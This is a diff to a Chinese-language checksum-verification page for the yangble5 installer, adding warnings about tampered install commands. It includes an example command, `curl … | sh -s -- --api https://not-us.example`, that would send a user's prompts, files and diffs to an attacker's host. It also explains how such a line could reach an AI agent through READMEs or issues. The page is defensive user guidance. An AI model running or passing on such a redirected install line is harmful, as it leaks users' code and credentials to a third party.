@@ -279,8 +279,22 @@ footer.site .wrap{display:grid; gap:var(--s-3)}
   <p class="eyebrow">校驗</p>
   <h1>執行之前，先自己核對</h1>
   <p class="lede">
-    首頁那一行是 <code>curl … | sh</code>。這種安裝方式的安全性，完全建立在「你信任 yangble5.com 這個網域，而且連線沒有被中間人竄改」之上。這一頁讓你不必只靠信任 —— 你可以自己驗。
+    首頁上有兩條路：把一行字貼給 AI agent，或者自己在終端機跑 <code>curl … | sh</code>。
+    兩條路最後執行的是<strong>同一份腳本</strong>，而這種安裝方式的安全性，完全建立在「你信任 yangble5.com 這個網域，而且連線沒有被中間人竄改」之上。這一頁讓你不必只靠信任 —— 你可以自己驗。
   </p>
+
+  <!-- The canonical agent line, repeated here on purpose: this is the page a
+       cautious reader lands on, so it must be possible to do the comparison
+       WITHOUT going back to the homepage first. -->
+  <div class="note">
+    <p style="margin:0">
+      <strong>先比對那一行。</strong>我們發佈給 AI agent 的字串<strong>只有一條</strong>，長這樣：<br>
+      <code>Install yangble5 by following https://yangble5.com/AGENTS.md</code><br>
+      它<strong>沒有旗標、沒有端點網址、沒有金鑰</strong>。你手上那一行只要跟它不是逐字相同 —— 多一個字、換一個網域、多一個
+      <code>--api</code> —— 就<strong>不是我們的</strong>。這一頁後面所有的雜湊校驗，都<em>擋不住</em>那種情況；
+      <a href="/#agent">首頁那一節</a>解釋為什麼。
+    </p>
+  </div>
 
   <!-- ── the live digest ───────────────────────────────────────────── -->
   <div class="digest">
@@ -399,6 +413,18 @@ $env:YANGBLE5_EMAIL = '<!--email_off-->you@example.com<!--/email_off-->'</pre>
   <h2>這個校驗能證明什麼、不能證明什麼</h2>
   <ul class="plain">
     <li><strong>能證明：</strong>你手上這份檔案，和我們公告雜湊時的那份檔案，位元組完全一致。傳輸過程沒有被改、沒有下載到一半壞掉。</li>
+    <li><strong>不能證明你「怎麼呼叫它」是對的 —— 這是這一頁最大的盲點，請讀完。</strong>
+      雜湊釘住的是<strong>腳本</strong>，不是<strong>命令列</strong>。一份雜湊完全相符、逐位元組正版的
+      <code>install.sh</code>，只要被寫成
+      <code>curl … | sh -s -- --api https://not-us.example</code>（<strong>示範，不要執行</strong>），
+      就會把你註冊到那台主機、把<em>它</em>發的金鑰寫進 <code>~/.yangble5/credentials</code>、
+      並把 <code>ANTHROPIC_BASE_URL</code> 指向它 —— 之後每一個用啟動器開的 session，
+      你的 prompt、檔案內容與 diff 都會送到它那裡。而這一頁的每一項校驗<strong>從頭到尾都會顯示「相符」</strong>。<br>
+      腳本擋得住一半：非預設端點會印出整片警告並<strong>拒絕繼續</strong>，除非有人在終端機打
+      <code>YES</code>，或明確加上 <code>--allow-nondefault-endpoint</code>；
+      <code>curl … | sh</code> 沒有終端機，所以那個旗標一定會出現在命令列裡，看得見。
+      另一半只有你能擋：<strong>逐字比對你被交到手上的那一行</strong>，尤其當它是從 README、部落格、issue
+      留言或某個 AI 轉述來的。如果你在用 AI agent 安裝，這件事更重要，因為那一行是<em>它</em>讀到的，不是你打的。</li>
     <li><strong>不能證明腳本本身是善意的。</strong>雜湊只保證「一致」，不保證「安全」。如果我們發佈了一份惡意腳本並公告它的雜湊，校驗一樣會過。這就是為什麼首頁把腳本做的每一件事都<a href="/#installer">逐條列出來</a>，而且原始碼公開 —— 校驗和公開原始碼要一起看，單獨任何一個都不夠。也是為什麼下面把它設的<a href="#env">每一個環境變數</a>和寫的<a href="#files">每一個檔案</a>逐字列在這裡。</li>
     <li><strong>不能防護網域本身被攻陷。</strong>如果 yangble5.com 被入侵，攻擊者可以同時換掉腳本和校驗檔。要防這種情況，請直接從
       <a href="https://github.com/shark0120/yangble5">GitHub repo</a> 取得腳本並核對 commit 歷史。</li>
